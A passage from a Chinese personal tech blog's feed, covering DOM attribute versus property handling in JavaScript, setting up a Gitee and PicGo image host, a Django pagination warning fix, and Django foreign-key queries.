&lt;p&gt;可以发现有一个名为&lt;code&gt;attributes&lt;/code&gt;的属性，类型是&lt;code&gt;NamedNodeMap&lt;/code&gt;，同时也可以找到标签自带的属性&lt;code&gt;id&lt;/code&gt;和&lt;code&gt;className&lt;/code&gt;、但明显没有&lt;code&gt;titles&lt;/code&gt;这个自定义的属性。这是因为每一个 DOM 对象在创建的时候，只会创建如&lt;code&gt;id, className&lt;/code&gt;这些基本属性，而们在 TAG 标签中自定义的属性是不会直接放到 DOM 中的。&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202205051102155.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202205051102155.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;从这里就可以看出，&lt;strong&gt;&lt;code&gt;attributes&lt;/code&gt;是属于&lt;code&gt;property&lt;/code&gt;的一个子集&lt;/strong&gt;。&lt;/p&gt;
&lt;h2 id=&#34;2attribute-取值赋值&#34;&gt;2.attribute 取值赋值&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;attribute&lt;/code&gt; 使用&lt;code&gt;setAttribute()&lt;/code&gt;和&lt;code&gt;getAttribute()&lt;/code&gt;进行操作，注意，&lt;code&gt;setAttribute()&lt;/code&gt;的两个参数，都必须是字符串。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getAttribute&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;id&amp;#34;&lt;/span&gt;);              
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;className&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getAttribute&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;class&amp;#34;&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;title&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getAttribute&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;title&amp;#34;&lt;/span&gt;);
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;getAttribute&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;value&amp;#34;&lt;/span&gt;);   &lt;span style=&#34;color:#75715e&#34;&gt;// 自定义属性
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setAttribute&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;class&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setAttribute&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;title&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;b&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setAttribute&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;title&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;c&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setAttribute&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;value&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;d&amp;#39;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3property-取值赋值&#34;&gt;3.property 取值赋值&lt;/h2&gt;
&lt;p&gt;&lt;code&gt;property&lt;/code&gt;取值赋值只需要使用点&lt;code&gt;.&lt;/code&gt;就可以了。对属性&lt;code&gt;property&lt;/code&gt;可以赋任何类型的值。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;id&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;className&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;className&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;childNodes&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;childNodes&lt;/span&gt;;
&lt;span style=&#34;color:#66d9ef&#34;&gt;var&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;attrs&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;attributes&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;className&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;a&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;align&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;center&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;AAAAA&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;div&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;BBBBB&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; [&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;];
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4property-和-attribute-的联系&#34;&gt;4.property 和 attribute 的联系&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;property&lt;/code&gt;能够从&lt;code&gt;attribute&lt;/code&gt;中得到同步；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;attribute&lt;/code&gt;不会同步&lt;code&gt;property&lt;/code&gt;上的值；&lt;/li&gt;
&lt;li&gt;&lt;code&gt;attribute&lt;/code&gt;和&lt;code&gt;property&lt;/code&gt;之间的数据绑定是单向的，&lt;code&gt;attribute-&amp;gt;property&lt;/code&gt;；&lt;/li&gt;
&lt;li&gt;更改&lt;code&gt;property&lt;/code&gt;和&lt;code&gt;attribute&lt;/code&gt;上的任意值，都会将更新反映到 HTML 页面中；&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 如下，更改 property 的值不能更改 attribute 的值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;in1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;new value of prop&amp;#39;&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;in1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;);               &lt;span style=&#34;color:#75715e&#34;&gt;// &amp;#39;new value of prop&amp;#39;
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;in1&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;attributes&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;);    &lt;span style=&#34;color:#75715e&#34;&gt;// 1
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;// 相反，更改 attribute 的值可以更改 property 的值
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;in2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;setAttribute&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;value&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ni&amp;#39;&lt;/span&gt;)
&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;in2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;);          &lt;span style=&#34;color:#75715e&#34;&gt;// ni
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;in2&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;attributes&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;value&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// value = &amp;#39;ni&amp;#39;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>随记—使用 Gitee&#43;PicGo 搭建图床</title>
        <link>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BD%BF%E7%94%A8-gitee&#43;picgo-%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</link>
        <pubDate>Sun, 25 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/%E9%9A%8F%E8%AE%B0/%E9%9A%8F%E8%AE%B0%E4%BD%BF%E7%94%A8-gitee&#43;picgo-%E6%90%AD%E5%BB%BA%E5%9B%BE%E5%BA%8A/</guid>
        <description>&lt;h2 id=&#34;1picgo&#34;&gt;1.PicGo&lt;/h2&gt;
&lt;p&gt;软件：&lt;a class=&#34;link&#34; href=&#34;https://github.com/Molunerfinn/PicGo/releases&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; Molunerfinn/PicGo · GitHub &lt;/a&gt;&lt;/p&gt;
&lt;p&gt;插件：&lt;code&gt;gitee-uploader&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;PS：注意插件的安装需要环境由&lt;code&gt;node.js&lt;/code&gt;，下载：&lt;a class=&#34;link&#34; href=&#34;https://nodejs.org/zh-cn/&#34;  target=&#34;_blank&#34; rel=&#34;noopener&#34;
    &gt; nodejs.org &lt;/a&gt;&lt;/p&gt;
&lt;h2 id=&#34;2gitee&#34;&gt;2.Gitee&lt;/h2&gt;
&lt;p&gt;1.新建一个公有仓库&lt;/p&gt;
&lt;p&gt;2.配置私人令牌(token)，在&lt;code&gt;设置&lt;/code&gt;中找到&lt;code&gt;安全设置&lt;/code&gt;，点击&lt;code&gt;私人令牌&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291737792.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291737792.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;3.点击&lt;code&gt;新建&lt;/code&gt;，仅选择下图两项，提交并验证密码后会展示&lt;code&gt;token&lt;/code&gt;，记录下来，后面操作会使用到。（注意：这个令牌只会明文显示一次）&lt;/p&gt;
&lt;p&gt;&lt;figure 
	&gt;
	&lt;a href=&#34;https://ac-lm.github.io/drawingbed/img/202204291737186.png&#34; &gt;
		&lt;img src=&#34;https://ac-lm.github.io/drawingbed/img/202204291737186.png&#34;
			
			
			
			loading=&#34;lazy&#34;
			&gt;
	&lt;/a&gt;
	
&lt;/figure&gt;&lt;/p&gt;
&lt;h2 id=&#34;3picgo配置&#34;&gt;3.PicGO配置&lt;/h2&gt;
&lt;p&gt;1.选择&lt;code&gt;图床设置&lt;/code&gt;，选择&lt;code&gt;gitee&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;2.进行配置&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;repo&lt;/strong&gt;：用户名/仓库名称（仓库地址后面那一段）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;branch&lt;/strong&gt;：分支，填写master&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;token&lt;/strong&gt;：填入前面获取的&lt;code&gt;私人令牌&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;path&lt;/strong&gt;：路径，一般填写img&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;customPath&lt;/strong&gt;：提交消息，可不填&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;customURL&lt;/strong&gt;：自定义地址，可不填&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;3.&lt;code&gt;上传区&lt;/code&gt;选择&lt;code&gt;gitee&lt;/code&gt;便可上传图片&lt;/p&gt;
</description>
        </item>
        <item>
        <title>BUG—Django 分页报错</title>
        <link>https://ac-lm.github.io/posts/bug/bugdjango-%E5%88%86%E9%A1%B5%E6%8A%A5%E9%94%99/</link>
        <pubDate>Sat, 24 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/bug/bugdjango-%E5%88%86%E9%A1%B5%E6%8A%A5%E9%94%99/</guid>
        <description>&lt;h2 id=&#34;bug-描述&#34;&gt;BUG 描述&lt;/h2&gt;
&lt;p&gt;Django 分页时报错&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;UnorderedObjectListWarning: Pagination may &lt;span style=&#34;color:#66d9ef&#34;&gt;yield&lt;/span&gt; inconsistent results &lt;span style=&#34;color:#66d9ef&#34;&gt;with&lt;/span&gt; an unordered object_list: &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;sign&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Guest&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;gt; QuerySet.paginator = Paginator(guest_list,5)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;resolution&#34;&gt;Resolution&lt;/h2&gt;
&lt;p&gt;这是因为 Django 分页是依照排序进行的，而未排序时进行分页便会发生该报错。定位分页依据的数据，对该数据进行排序&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;paginator &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Paginator(gList, &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;)
gList &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; G&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;all()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;order_by(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;id&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Django—外键查询</title>
        <link>https://ac-lm.github.io/posts/django/django%E5%A4%96%E9%94%AE%E6%9F%A5%E8%AF%A2/</link>
        <pubDate>Sat, 24 Jul 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/django%E5%A4%96%E9%94%AE%E6%9F%A5%E8%AF%A2/</guid>
        <description>&lt;h2 id=&#34;1查询示例&#34;&gt;1.查询示例&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Publish&lt;/span&gt;(models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Model):
    id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AutoField(primary_key&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;, auto_created&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
    pname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CharField(max_length&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;40&lt;/span&gt;)
    city &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CharField(max_length&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;50&lt;/span&gt;)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __str__(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pname

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Author&lt;/span&gt;(models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Model):
    id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AutoField(primary_key&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;, auto_created&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
    aname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CharField(max_length&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __str__(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;aname

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Book&lt;/span&gt;(models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Model):
    id &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;AutoField(primary_key&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;, auto_created&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
    bname &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CharField(max_length&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;30&lt;/span&gt;)
    price &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;IntegerField()
    publish &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ForeignKey(Publish, on_delete&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;CASCADE)
    author &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;ManyToManyField(Author)

    &lt;span style=&#34;color:#66d9ef&#34;&gt;def&lt;/span&gt; __str__(self):
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; self&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;bname
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2通过类属性查询&#34;&gt;2.通过类属性查询&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# get方法的到的结果是一个对应类的对象&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 查询某本书的出版社名字&lt;/span&gt;
book &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;publish&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;pname

&lt;span style=&#34;color:#75715e&#34;&gt;# 查询某出版社下面有多少本书&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 此处的book是Book这张表的表名的小写（必须是小写）加上_set&lt;/span&gt;
pub &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; Publish&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;get(id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
pub&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;book_set&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;all()
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3通过双下划线查询&#34;&gt;3.通过双下划线查询&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# 通过出版社的相关信息进行查询某一本书&lt;/span&gt;
Book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(publish__city&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;北京&amp;#39;&lt;/span&gt;)
Book&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(publish__id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# 通过书籍的相关信息进行查询其出版社&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 此处的book是Book这张表的表名的小写（必须是小写）&lt;/span&gt;
Publish&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;objects&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;filter(book__id&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)

&lt;span style=&#34;color:#75715e&#34;&gt;# 在values以及values_list中使用（必须加引号）&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# 通过书籍的相关信息进行查询其出版社&lt;/span&gt;
&lt;span style=&#34;color:#75715e&#34;&gt;# values得到的结果是一个内部是字典的查询集&lt;/span&gt;
